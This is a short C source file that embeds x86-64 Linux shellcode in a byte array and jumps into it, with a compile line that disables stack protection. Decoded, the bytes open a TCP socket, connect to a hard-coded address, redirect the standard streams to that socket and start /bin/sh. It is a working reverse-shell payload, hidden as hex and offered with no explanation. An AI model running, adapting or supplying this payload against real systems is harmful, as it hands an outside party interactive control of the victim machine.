/* gcc -zexecstack -o shellcode shellcode.c */

#include <stdio.h>

unsigned char code[] = "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x97\xb0\x2a\x48\xb9\xfe\xff\xee\xa3\x80\xff\xff\xfe\x48\xf7\xd9\x51\x54\x5e\xb2\x10\x0f\x05\x6a\x03\x5e\xb0\x21\xff\xce\x0f\x05\x75\xf8\x99\xb0\x3b\x52\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x51\x54\x5f\x0f\x05";

int main(void) {
    printf("shellcode length: %d\n", (int)sizeof(code)-1);
    ((void(*)())code)();
    return 0;
}
